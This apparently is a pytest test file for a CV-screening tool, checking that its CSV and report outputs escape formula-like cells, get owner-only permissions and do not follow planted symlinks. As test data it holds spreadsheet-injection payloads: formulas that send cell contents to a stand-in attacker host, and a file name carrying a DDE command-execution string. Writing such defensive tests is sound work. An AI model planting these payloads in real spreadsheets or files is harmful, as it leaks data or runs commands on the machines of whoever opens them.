"""Outputs must be safe to open: applicant text never becomes a formula, markup or a leak."""

import csv
import os
import stat

import pytest

from cv_screen.extract import MockExtractor
from cv_screen.pipeline import run_screening
from cv_screen.report import write_outputs

FORMULA_START = ("=", "+", "-", "@", "\t", "\r")

HOSTILE_CV = """Name: =HYPERLINK("https://evil.example/?d="&A2,"Verify")
Experience
Customer Service Agent, Example Shop - 03/2022 - present
- Answered customer emails
Languages
German: native
English: C1
Skills
=WEBSERVICE("http://evil.example/"&B2), live chat
"""


@pytest.fixture
def hostile_run(tmp_path, job, as_of):
    folder = tmp_path / "cvs"
    folder.mkdir()
    (folder / "=2+5+cmd|' -C calc'!A0.txt").write_text(HOSTILE_CV, encoding="utf-8")
    (folder / "-broken.pdf").write_bytes(b"%PDF-1.4 garbage")
    (folder / "@plain.txt").write_text("Skills\n- Excel, live chat\n", encoding="utf-8")
    return run_screening(folder, job, MockExtractor(), as_of)


def test_csv_cells_never_start_like_a_formula(hostile_run, tmp_path):
    out = tmp_path / "out"
    write_outputs(hostile_run, out)
    rows = list(csv.reader((out / "shortlist.csv").open(encoding="utf-8")))
    assert len(rows) == 4
    for row in rows[1:]:
        for cell in row:
            assert not cell.startswith(FORMULA_START), (cell, row)
    source_files = {r[rows[0].index("source_file")] for r in rows[1:]}
    assert "'=2+5+cmd|' -C calc'!A0.txt" in source_files  # escaped, not dropped
    assert "'-broken.pdf" in source_files


@pytest.fixture
def open_umask():
    old = os.umask(0)  # the most permissive umask: modes must not depend on it
    yield
    os.umask(old)


def _modes(out):
    return {str(p.relative_to(out)): stat.S_IMODE(p.stat().st_mode) for p in out.rglob("*")}


def test_outputs_are_owner_only_whatever_the_umask(hostile_run, tmp_path, open_umask):
    out = tmp_path / "out"
    write_outputs(hostile_run, out)
    assert stat.S_IMODE(out.stat().st_mode) == 0o700
    modes = _modes(out)
    assert {m for p, m in modes.items() if (out / p).is_dir()} == {0o700}
    assert {m for p, m in modes.items() if (out / p).is_file()} == {0o600}


def test_existing_outputs_are_tightened(hostile_run, tmp_path, open_umask):
    out = tmp_path / "out"
    (out / "candidates").mkdir(parents=True, mode=0o777)
    out.chmod(0o777)
    (out / "shortlist.md").write_text("old")
    (out / "shortlist.md").chmod(0o666)
    write_outputs(hostile_run, out)
    assert stat.S_IMODE(out.stat().st_mode) == 0o700
    assert set(_modes(out).values()) <= {0o700, 0o600}


def test_outputs_do_not_follow_planted_symlinks(hostile_run, tmp_path):
    out = tmp_path / "out"
    out.mkdir()
    target = tmp_path / "victim.txt"
    target.write_text("keep me")
    (out / "shortlist.md").symlink_to(target)
    with pytest.raises(OSError):
        write_outputs(hostile_run, out)
    assert target.read_text() == "keep me"
